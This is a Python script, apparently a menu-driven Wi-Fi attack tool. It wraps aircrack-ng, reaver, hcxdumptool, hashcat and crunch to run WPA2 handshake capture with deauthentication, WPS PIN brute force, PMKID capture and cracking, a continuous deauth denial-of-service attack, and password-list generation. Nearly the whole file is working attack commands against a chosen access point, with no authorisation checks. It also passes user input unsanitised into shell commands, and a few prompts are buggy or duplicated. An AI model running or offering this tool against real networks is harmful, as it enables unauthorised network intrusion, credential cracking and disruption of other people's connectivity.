import os
import time
import subprocess
from subprocess import check_call

interface = None

def start():
    print("\nInstalling necessary Tools..")
    print("This may take a while, please be patient\n")
    os.system("apt-get update && apt-get install xterm aircrack-ng hcxtools hcxdumptool crunch reaver -y")
    os.system("sleep 3 && clear")

def main():
    cmd = os.system("clear")
    print("""\033[1;92m
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░█░█░▀█▀░█▀▀░▀█▀░░░░░░░░░█▀█░█▀▀░█▀█░▀█▀░█▀▀░█▀▀░▀█▀░░░▀█▀░█▀█░█▀█░█░░
░█▄█░░█░░█▀▀░░█░░░░▄▄▄░░░█▀▀░█▀▀░█░█░░█░░█▀▀░▀▀█░░█░░░░░█░░█░█░█░█░█░░
░▀░▀░▀▀▀░▀░░░▀▀▀░░░░░░░░░▀░░░▀▀▀░▀░▀░░▀░░▀▀▀░▀▀▀░░▀░░░░░▀░░▀▀▀░▀▀▀░▀░░
                                            
-------------------------------------------------------------------------  
[+] You may need external wifi adapter for some features
[+] Press CTRl + B to go back to main menu

(1)Networks attacks (Bssid,monitor mode needed)       
(2)Scan Networks
(3)Capturing Handshake(monitor mode needed)                    
(4)Crack Handshake (Handshake needed)               
(5)Create your own passwordlist

(00)Exit
----------------------------------------------------------------------- """)
    print("\n")
    number = input("[+] Enter the number : ")

    if number == "1":
        network_attacks()
    elif number == "2":
        show_networks()
    elif number == "3":
        capture_handshake()
        main()
    elif number == "4":
        crack_handshake()
    elif number == "5":
        create_passwordlist()
    elif number == "00":
        exit()
    else:
        print("Invalid number..")
        time.sleep(2)
        main()
    
def start_monitor_mode():
    global interface
    interface = input("\nEnter the interface (Default: wlan0): ").strip()
    if not interface:
        interface = "wlan0"
    subprocess.run("airmon-ng start " + interface, shell=True)
    subprocess.run("airmon-ng check kill", shell=True)

    print(f"\n{interface} set to monitor mode..")
    time.sleep(4)

def stop_monitor_mode():
    global interface
    if interface is None:
        print("\n[!] Monitor mode is not started yet.")
        return

    subprocess.run(["airmon-ng", "stop", interface])
    print(f"\nMonitor mode stopped on {interface}..")
    interface = None
    time.sleep(4)
    main()


def network_attacks():
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()
    print("\n")
    print("1. WPA2 aircrack-ng Attack")
    print("2. WPS Reaver Attack")
    print("3. PMKID Attack")
    print("4. Continuous Denial of Service (DoS) Attack")
    print("\n")
    choice = input("[+] Enter the number : ").strip()
    if choice == "1":
        wpa2_attack()
    elif choice == "2":
        wps_attack()
    elif choice == "3":
        pmkid_attack()
    elif choice == "4":
        deauth_attack()
    else:
        print("Invalid number..")
        network_attacks()


def show_networks():
    global interface
    if interface is None:
        print("\n[!] Monitor mode is not started yet.")
        return
    print("\n[+] Scanning for networks... Press CTRL+C to stop.\n")
    time.sleep(2)
    os.system(f"airodump-ng {interface}")


def capture_handshake():
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()

    show_networks()

    bssid = input("\n[+] Enter the BSSID of the target AP : ").strip()
    channel = input("\n[+] Enter Channel of the target AP : ").strip()
    subprocess.run(["iwconfig", interface, "channel", channel])

    print("\nStarting airodump-ng... Press CTRL+C to stop.")
    time.sleep(3)
    print(f"\nWait until it shows 'WPA handshake : {bssid}'.")
    os.system(f"airodump-ng --bssid {bssid} -c {channel} --write handshake {interface} & xterm -e aireplay-ng --deauth 25 -a {bssid} {interface}")
    handshake_path = os.path.join(os.getcwd(), "handshake" + "-01.cap")
    print(f"\nHandshake captured. Check at {handshake_path}\n")
    time.sleep(5)
    return bssid, channel , handshake_path

def crack_handshake():
    print("\n[1] Crack Handshake using existing wordlist")
    print("[2] Crack Handshake using custom wordlist")
    choice = input("\n[+] Enter the number: ").strip()
    handshake_path = input("\nEnter the path of the handshake file: ").strip()
    if choice == "1":
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        rockyou_gz_path = "/usr/share/wordlists/rockyou.txt.gz"
        if not os.path.exists(rockyou_path):
            if os.path.exists(rockyou_gz_path):
                print("\nExtracting rockyou.txt ...")
                os.system(f"gzip -d {rockyou_gz_path}")
            else:
                print("\n[!] rockyou.txt or rockyou.txt.gz not found!")
                return
        print("\nTo exit Press CTRL +C")
        os.system(f"aircrack-ng {handshake_path} -w {rockyou_path}")
    elif choice == "2":
        wordlist = input("\nEnter the path of the wordlist file: ").strip()
        if not os.path.exists(wordlist):
            print("\n[!] Wordlist file not found!")
            return
        print("\nTo exit Press CTRL +C")
        os.system(f"aircrack-ng {handshake_path} -w {wordlist}")
    else:
        print("\n[!] Invalid option. Please enter 1 or 2.")
        crack_handshake()
    time.sleep(15)
    main()


def wpa2_attack():
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()
    
    bssid, channel, handshake_path = capture_handshake()
    
    print("\n[1] Crack Handshake using existing wordlist")
    print("[2] Crack Handshake using custom wordlist")
    choice = input("\n[+] Enter the number: ").strip()
    
    if choice == "1":
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        rockyou_gz_path = "/usr/share/wordlists/rockyou.txt.gz"
        if not os.path.exists(rockyou_path):
            if os.path.exists(rockyou_gz_path):
                print("\nExtracting rockyou.txt ...")
                os.system(f"gzip -d {rockyou_gz_path}")
            else:
                print("\n[!] rockyou.txt or rockyou.txt.gz not found!")
                return
        print("\nTo exit Press CTRL +C")
        os.system(f"aircrack-ng {handshake_path} -w {rockyou_path}")
    elif choice == "2":
        wordlist = input("\nEnter the path of the wordlist file: ").strip()
        if not os.path.exists(wordlist):
            print("\n[!] Wordlist file not found!")
            return
        print("\nTo exit Press CTRL +C")
        os.system(f"aircrack-ng {handshake_path} -w {wordlist}")
    else:
        print("\n[!] Invalid option. Please enter 1 or 2.")
        wpa2_attack()
    time.sleep(15)
    main()


def wps_attack():
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()

    os.system("wash --interface " + interface)
    print("Make sure the target AP's WPS is enabled and unlocked.")

    bssid = input("\nEnter the BSSID of the target AP : ").strip()
    channel = input("\nEnter Channel of the target AP : ").strip()

    subprocess.run(["iwconfig", interface, "channel", channel])
    print("Starting Reaver attack...(It may take hours to crack)\nPlease be patient.")
    time.sleep(2)
    os.system(f"reaver -i {interface} -b {bssid} -c {channel} -vv -K 1")
    print("\nWPS attack stopped.\n")
    time.sleep(4)
    main()


def pmkid_attack():
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()

    show_networks()

    bssid = input("\nEnter the BSSID of the target AP : ").strip()
    channel = input("\nEnter Channel of the target AP : ").strip()
    subprocess.run(["iwconfig", interface, "channel", channel])

    print("\nStarting hcxdumptool to capture PMKID... Press CTRL+C to stop.")
    time.sleep(3)
    os.system(f"hcxdumptool -i {interface} --enable_status=1 -o pmkid.pcapng --filterlist_ap={bssid} --filtermode=2")
    
    pmkid_path = os.path.join(os.getcwd(), "pmkid.pcapng")
    print(f"\nPMKID captured. Check at {pmkid_path}\n")
    time.sleep(5)

    print("\n[1] Crack PMKID using existing wordlist")
    print("[2] Crack PMKID using custom wordlist")
    choice = input("\n[+] Enter the number: ").strip()

    if choice == "1":
        rockyou_path = "./rockyou.txt"
        rockyou_gz_path = "./rockyou.txt.gz"
        if not os.path.exists(rockyou_path):
            if os.path.exists(rockyou_gz_path):
                print("\nExtracting rockyou.txt ...")
                os.system(f"gzip -d {rockyou_gz_path}")
            else:
                print("\n[!] rockyou.txt or rockyou.txt.gz not found!")
                return
        print("\nTo exit Press CTRL +C")
        os.system(f"hcxpcapngtool -o pmkid.22000 {pmkid_path}")
        os.system(f"hashcat -m 22000 pmkid.22000 {rockyou_path}")
    elif choice == "2":
        wordlist = input("\nEnter the path of the wordlist file: ").strip()
        if not os.path.exists(wordlist):
            print("\n[!] Wordlist file not found!")
            return
        print("\nTo exit Press CTRL +C")
        os.system(f"hcxpcapngtool -o pmkid.22000 {pmkid_path}")
        os.system(f"hashcat -m 22000 pmkid.22000 {wordlist}")
    else:
        print("\n[!] Invalid option. Please enter 1 or 2.")
        pmkid_attack()
    time.sleep(15)
    main()


def deauth_attack():
    global interface
    if interface is None:
        print("\n[!] Your adapter must be in monitor mode first.")
        start_monitor_mode()

    show_networks()

    bssid = input("\nEnter the BSSID of the target AP : ").strip()
    packets = input("\nEnter the number of deauth packets (0 for infinite) : ").strip()
    channel = input("\nEnter Channel of the target AP : ").strip()

    subprocess.run(["iwconfig", interface, "channel", channel])
    print("Sending deauth packets... Press CTRL+C to stop.")
    time.sleep(5)
    os.system(f"aireplay-ng --deauth {packets} -a {bssid} {interface}")
    print("\nDeauth attack stopped.\n")
    time.sleep(4)
    main()


def create_passwordlist():
    print("\n[+] Size of the file and time taken to create the password list depends on your input..")
    print("\n[+] Enter the characters to be included in the password list.")
    print("[+] Example: if you only want list include numbers enter : 0123456789")
    characters = input("\n[+] Enter the characters : ").strip()
    length = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
    output = input("\n[+] Enter the minimum length of the password (8/64) : ").strip()
    print("\nCreating password list... Please wait.")
    subprocess.run(f"crunch {length} {length} {characters} -o passwordlist.txt", shell=True)
    a = os.getcwd()
    print(f"\nPassword list created at {a}\n")
    time.sleep(5)
    choice = input("\nDo you want to crack handshake using this password list? (y/n) : ")
    if choice == "y":
        handshake_path = input("\n[+] Enter the path of the handshake file: ").strip()
        print("\nTo exit Press CTRL +C")
        os.system(f"aircrack-ng {handshake_path} -w passwordlist.txt")
    time.sleep(15)
    main()



start()
main()
